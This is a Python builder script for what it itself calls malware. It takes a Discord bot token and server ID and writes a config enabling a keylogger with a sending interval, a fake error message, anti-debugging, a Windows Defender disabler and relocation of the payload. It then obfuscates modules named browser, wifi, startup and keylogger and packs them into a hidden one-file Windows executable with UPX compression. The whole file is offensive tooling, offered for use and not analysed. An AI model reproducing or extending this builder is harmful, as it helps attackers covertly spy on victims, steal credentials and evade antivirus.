import subprocess
import os
from colorama import Fore, Style
import sys
import time


def obfuscate(path):
    try:
        subprocess.run(f"pyminifier -o {path}/main.py {path}/main.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# main.py
        subprocess.run(f"pyminifier -o {path}/modules/browser.py {path}/modules/browser.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/browser.py
        subprocess.run(f"pyminifier -o {path}/modules/info.py {path}/modules/info.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/info.py
        subprocess.run(f"pyminifier -o {path}/modules/startup.py {path}/modules/startup.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/startup.py
        subprocess.run(f"pyminifier -o {path}/modules/antidebug.py {path}/modules/antidebug.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/antidebug.py
        subprocess.run(f"pyminifier -o {path}/modules/wifi.py {path}/modules/wifi.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/wifi.py
        subprocess.run(f"pyminifier -o {path}/modules/keylogger.py {path}/modules/keylogger.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/keylogger.py
    except:
        print("[-] To obfuscate please install pyminifier or disable obfuscation from building options!")
        time.sleep(3)
        sys.exit(1)


def build(path, icon, file, upx=True, obf=True):
    print(Fore.BLUE +"[+] Building exe..."+ Style.RESET_ALL)
    if obf: obfuscate(path)
    
    if upx:
        UpxArg = "--upx-dir C:/UPX"
    else:
        UpxArg = ""
    
    try:
        subprocess.run(f"pyinstaller  --onefile -w -i {icon} --clean {UpxArg} {file}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
        print(Fore.GREEN +"[+] Building exe successfully finished!"+ Style.RESET_ALL)
        print(Fore.GREEN +"[+] All done!"+ Style.RESET_ALL)
        time.sleep(3)
    except:
        print(Fore.RED +"[-] Please make sure you have pyinstaller, pyarmor and UPX installed under C:/UPX!"+ Style.RESET_ALL)
        time.sleep(3)
        sys.exit(1)


def convert(value, name):
    if value.lower() == "y":
        return True
    elif value.lower() == "n":
        return False
    else:
        print(Fore.RED +f"[-] Choice for {name} is invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
        time.sleep(3)
        sys.exit(0)


def config(path, token, guild_id, interval, error, antidebug, defender, move):    
    config = f"TOKEN = '{token}'\nGUILD_ID = '{guild_id}'\nINTERVAL = {interval}\nERROR = {error}\nANTIDEBUG = {antidebug}\nDEFENDER = {defender}\nMOVE = {move}"
    
    if not os.path.exists(path):
        print(Fore.RED +f"[-] Please make sure you have source code under '{path}' folder relative to builder or edit building options!"+ Style.RESET_ALL)
        time.sleep(3)
        sys.exit(1)
    
    with open(f"{path}\config.py", "w") as f:
        f.write(config)


token = input("[?] Enter bot token: ")
guild_id = input("[?] Enter server ID (guild ID): ")
interval = input("[?] Enter interval for keylogger sending (in secondes): ")
error = input("[?] Enable fake error? [Y/n]: ")
antidebug = input("[?] Enable antidebug? [Y/n]: ")
defender = input("[?] Enable win defender disabler? [Y/n]: ")
move = input("[?] Move the malware to the special location? [Y/n]: ")


choice = input("> Do you want to edit building options[y/N]: ")
if choice.lower() == "y":
    obf = input("[?] Do you want to enable obfuscation? [Y/n]: ")
    upx = input("[?] Use UPX? [Y/n]: ")
    icon = input("[?] Enter icon file: ")
    path = input("[?] Enter source code directory: ")
    
    config(path, token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move"))
    build(path, icon, f"{path}\main.py", convert(upx, "UPX"), convert(obf, "obfuscation"))
    
elif choice.lower() == "n":
    config("src", token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move"))
    build("src", "icon.ico", "src\main.py")
    
else:
    print(Fore.RED +"[-] Your choice was invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
    time.sleep(3)
    sys.exit(0)
